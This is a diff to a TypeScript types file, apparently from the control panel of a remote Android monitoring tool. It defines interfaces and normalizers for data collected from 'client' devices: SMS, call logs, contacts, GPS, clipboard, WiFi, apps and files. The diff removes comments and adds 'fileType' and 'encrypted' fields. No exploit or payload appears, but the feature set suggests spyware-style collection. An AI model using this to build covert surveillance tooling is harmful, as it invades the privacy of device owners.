@@ -65,7 +65,6 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'logs:view', 'settings:view',
 ];
 
-// Matches backend PERMISSION_GROUPS for UI categorization
 export const PERMISSION_GROUPS = [
   {
     label: 'Device Features',
@@ -106,16 +105,12 @@ export const PERMISSION_GROUPS = [
   },
 ];
 
-// ─── Device Outlet Context ────────────────────────────────────
-
 export interface DeviceOutletContext {
   client: ClientDevice | null;
   clientId: string;
   loadClient: () => void;
   online: boolean;
 }
-
-// ─── Core Domain Types ────────────────────────────────────────
 
 export interface ClientDevice {
   id: string; ip: string; country: string | null; city: string | null;
@@ -140,7 +135,7 @@ export interface DeviceInfo {
   phone?: { imei: string; number: string; network: string };
 }
 
-export interface ClientFile { id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; }
+export interface ClientFile { id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; fileType?: string; }
 export interface LogEntry { id: number; type: string; category: string; message: string; details: string | null; created_at: string; }
 
 export interface ServerConfig {
@@ -174,39 +169,31 @@ export interface UserItem {
   lastLogin: string | null;
 }
 
-// --- Device Data Type Interfaces (Normalized) ---
-// Dual-field properties from backend are normalized here.
-// The `extractData` function in each page component maps
-// raw backend data to these normalized interfaces.
-
 export interface SmsMessage {
-  /** Sender/recipient address (normalized from address|from) */
   address: string;
-  /** Message body (normalized from body|message) */
+
   body: string;
-  /** Timestamp string (normalized from date|time) */
+
   date: string;
-  /** SMS type: 1=Received, 2=Sent */
+
   type: number;
 }
 
 export interface CallRecord {
-  /** Call type: 1=Incoming, 2=Outgoing, 3=Missed */
   type: number;
-  /** Phone number (normalized from number|phone) */
+
   number: string;
-  /** Contact name (normalized from name|cachedName) */
+
   name: string;
-  /** Call duration in seconds */
+
   duration: number;
-  /** Timestamp string (normalized from date|time) */
+
   date: string;
 }
 
 export interface ContactEntry {
-  /** Contact name (normalized from name|displayName) */
   name: string;
-  /** Phone number (normalized from number|phone) */
+
   number: string;
   type: string;
 }
@@ -217,7 +204,7 @@ export interface GpsLocation {
   accuracy?: number;
   speed?: number;
   provider?: string;
-  /** Timestamp (normalized from time|timestamp) */
+
   time: string;
 }
 
@@ -227,25 +214,23 @@ export interface CameraDevice {
 }
 
 export interface WifiNetwork {
-  /** Network name (normalized from ssid|SSID) */
   ssid: string;
-  /** Access point MAC (normalized from bssid|BSSID) */
+
   bssid: string;
-  /** Signal level in dBm */
+
   level?: number;
-  /** Security type (normalized from security|capabilities) */
+
   security: string;
   frequency?: number;
 }
 
 export interface ClipboardEntry {
-  /** Clipboard text (normalized from text|content) */
   text: string;
-  /** Character length */
+
   length: number;
   label?: string;
   mimeType?: string;
-  /** Timestamp (normalized from timestamp|time) */
+
   timestamp: string;
 }
 
@@ -261,28 +246,27 @@ export interface NotificationEntry {
 }
 
 export interface PermissionEntry {
-  /** Permission name (normalized from permission|name) */
   name: string;
   allowed?: boolean;
 }
 
 export interface AppEntry {
-  /** App display name (normalized from name|appName) */
   name: string;
-  /** Package identifier (normalized from packageName|package) */
+
   packageName: string;
-  /** Whether this is a system app (normalized from systemApp|isSystem) */
+
   isSystem: boolean;
 }
 
 export interface FileEntry {
   name: string;
-  /** Whether this is a directory (normalized from isDir|isDirectory) */
+
   isDir: boolean;
   path: string;
   size?: number;
   lastModified?: number | string;
   date?: string;
+  encrypted?: boolean;
 }
 
 export interface NotificationStatus {
@@ -290,14 +274,10 @@ export interface NotificationStatus {
   connected: boolean;
 }
 
-// --- Normalization helpers for extractData ---
-
-/** Safely extract a list from raw API data, with runtime Array check */
 export function extractList<T>(raw: unknown): T[] {
   return Array.isArray(raw) ? raw : [];
 }
 
-/** Pick first non-null/undefined value from candidates */
 export function coalesce(...values: (unknown)[]): string {
   for (const v of values) {
     if (v != null && v !== '') return String(v);
@@ -305,7 +285,6 @@ export function coalesce(...values: (unknown)[]): string {
   return '';
 }
 
-/** Normalize raw SMS data from backend */
 export function normalizeSmsList(raw: unknown[]): SmsMessage[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -318,7 +297,6 @@ export function normalizeSmsList(raw: unknown[]): SmsMessage[] {
   });
 }
 
-/** Normalize raw call data from backend */
 export function normalizeCallList(raw: unknown[]): CallRecord[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -332,7 +310,6 @@ export function normalizeCallList(raw: unknown[]): CallRecord[] {
   });
 }
 
-/** Normalize raw contact data from backend */
 export function normalizeContactList(raw: unknown[]): ContactEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -344,7 +321,6 @@ export function normalizeContactList(raw: unknown[]): ContactEntry[] {
   });
 }
 
-/** Normalize raw WiFi data from backend */
 export function normalizeWifiList(raw: unknown[]): WifiNetwork[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -358,7 +334,6 @@ export function normalizeWifiList(raw: unknown[]): WifiNetwork[] {
   });
 }
 
-/** Normalize raw clipboard data from backend */
 export function normalizeClipboardList(raw: unknown[]): ClipboardEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -372,7 +347,6 @@ export function normalizeClipboardList(raw: unknown[]): ClipboardEntry[] {
   });
 }
 
-/** Normalize raw permission data from backend */
 export function normalizePermissionList(raw: unknown[]): PermissionEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -383,7 +357,6 @@ export function normalizePermissionList(raw: unknown[]): PermissionEntry[] {
   });
 }
 
-/** Normalize raw app data from backend */
 export function normalizeAppList(raw: unknown[]): AppEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
@@ -395,7 +368,6 @@ export function normalizeAppList(raw: unknown[]): AppEntry[] {
   });
 }
 
-/** Normalize raw file data from backend */
 export function normalizeFileList(raw: unknown[]): FileEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
